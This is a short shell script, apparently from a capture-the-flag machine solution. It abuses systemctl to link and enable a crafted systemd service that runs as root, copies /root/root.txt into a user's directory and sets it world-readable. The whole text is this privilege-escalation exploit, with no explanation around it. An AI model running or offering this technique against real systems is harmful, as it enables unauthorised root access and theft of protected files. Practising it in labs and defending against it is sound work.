TF=$(mktemp -p /home/pepper).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cp /root/root.txt /home/pepper/backoff/root.txt; chmod 777 /home/pepper/backoff/root.txt"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
